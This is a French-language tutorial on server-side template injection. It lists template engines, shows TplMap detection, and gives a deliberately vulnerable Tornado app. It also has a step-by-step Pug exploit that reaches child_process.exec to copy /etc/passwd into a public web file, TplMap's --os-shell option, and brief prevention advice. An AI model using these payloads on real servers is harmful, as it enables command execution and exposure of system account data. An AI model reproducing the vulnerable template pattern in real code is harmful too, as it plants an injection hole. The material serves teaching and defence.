# Failles web - injection de template

## Description
Les templates permettent d'alléger l'écriture du code html résultant. Le développeur va pouvoir instancier dynamiquement un template avec seulement des données pour générer le contenu final html.

Voici quelques moteurs de template:
* Java : Free marker, Velocity
* PHP : smarty, twig
* python : Jinja, tornado 
* ruby : Liquid
* Node : Pug

L'injection consiste à exploiter une entrée utilisateur non sécurisée, dans le but d'injecter des directives de template qui conduiront par exemple à l'exécution de code arbitraire.

## Détection
[TplMap](https://github.com/epinna/tplmap) est un outil python permettant la détection de la faille (SSTI -> Server Side Template Injection). Il est en plus de la détection, de pouvoir exploiter les vulnérabilités du site.

    $ ./tplmap.py -u http://domain.com/?data=injection
L'outil va détecter le point d'entrée, le système d'exploitation, le moteur et les possibilités d'exploitation (shell, accès fichiers, injection de code ...)

## Intention
L'injection de template permet :
* l'execution de code arbitraire sur le serveur
* la mise en place d'une backdoor
* l'accès au système de fichiers

## Exploitation

### Exploitation de tornado en python
L'exemple est disponible [ici](http://sysblog.informatique.univ-paris-diderot.fr/2020/03/19/la-vulnerabilite-des-templates-linjection-de-template/). Soit `test.py` :

    import tornado.template
    import tornado.ioloop
    import tornado.web

    # exemple d'injection de template en utilisant le moteur de template "Tornado"
    # la variable donnee est le code injectee par l'utilisateur 
    TEMPLATE = '''
    <html>
    <head><title> Texte injecte  est : {{ donnee }} </title></head> 
    <body> Texte de injecte est :  TEXT </body>
    </html>
    '''
    class Main(tornado.web.RequestHandler):
    
        def get(self):
            donnee = self.get_argument('donnee', '')
            template_data = TEMPLATE.replace("TEXT",donnee)
            t = tornado.template.Template(template_data)
            self.write(t.generate(donnee=donnee))
    
    application = tornado.web.Application([
        (r"/", Main),
    ], debug=True, static_path=None, template_path=None)
    
    if __name__ == '__main__':
        application.listen(8000)
        tornado.ioloop.IOLoop.instance().start()

Puis:

    $ python -m pip install tornado
    $ python test.py

Dans le navigateur:

    http://localhost:8000/?donnee=Injected Data

La page retourné contiendra le texte injecté "Injected Data"

### Exploitation de Pug
Pug, comme python, va utliser les espaces comme caractères sensibles.
Un saut de ligne (CRLF : `%0a`) permet de signifier que nous injectons une nouvelle entrée pour le moteur.

Nous allons chercher à acceder à l'objet global self, pour ensuite chercher à quelle fonctions nous avons accès. Un accès à `require` permttrait d'injecter des commandes via le processus enfant `(child_process).exec()`.

Toutes les manipulations doivent se faire avec l'URL encodée, pour cela Burp va être d'un grand secours.

Pour voir si nous avons accès à global, injectons `%0a=global` et observons la réponse sous Burp. Si on voit `[object global]` c'est ok.

Pour trouver les objets de global, nous allons injecter (encodée en URL): 

    each val,index in global
    p=index
Nous espérons trouver l'objet global.process. Si oui nous pouvons l'explorer en injectant (encodé en URL):

    each val,index in global
    p=index
Ainsi de suite, qui va nous amner à `mainModule` puis enfin `require` (`global.process.mainModule.require`). Nous allons pouvoir injecter du code avec le child_process.

Nous allons utiliser la fonction `exec` du child_process pour exécuter des commandes systèmes. Pour cela, nous définissions une variable correspondant à `require` et le `-` qui permet une sortie non stockée dans le buffer. Nous injectons donc (encodé en URL):

    - var x = global.process.mainModule.require
    - x('child_process').exec('cat /etc/passwd >> /opt/web/mywebapp/public/accounts.txt')
Le résultat est l'apparition du fichier accounts.txt à la racine du site web avec la liste des comptes du système.

Tout se travail peut être automatisé avec un outil comme TplMap

### `TplMap`
[TplMap](https://github.com/epinna/tplmap) permet de renseigner l'attaquant sur les exploitations possible d'un serveur vulnérable. Il permet, comme SQLmap de faciliter grandement le travail.

    $ ./tplmap.py -u http://domain.com/?user=john
Donne le point d'entrée, le système d'exploitation, le moteur et les possibilités d'exploitation.

L'option `--os-shell` permet de lancer un pseudo shell

    $ ./tplmap.py --os-shell -u http://domain.com/?user=john

## Prévention
Pour se prémunir il faut sécurisé l'entrée utilisateur tout comme nous le ferions avec la fonction `eval()` de Node. Si possible chargé des fichiers de templates statiques.

Il faut également sécurisé l'entrée pour ne pas que l'utilisateur contrôle l'accès à un fichier, comme nous le ferions avec les fonctions `include()` et `require()` de php dans le cadre de LFI.

Si possible ne pas passer les données dynamiques directement dans le fichier de template. Utiliser plutôt les fonctionnalités embarqués par le moteur de template pour convertir les expressions en leur résultats à la place.

## Liens
* http://sysblog.informatique.univ-paris-diderot.fr/2020/03/19/la-vulnerabilite-des-templates-linjection-de-template/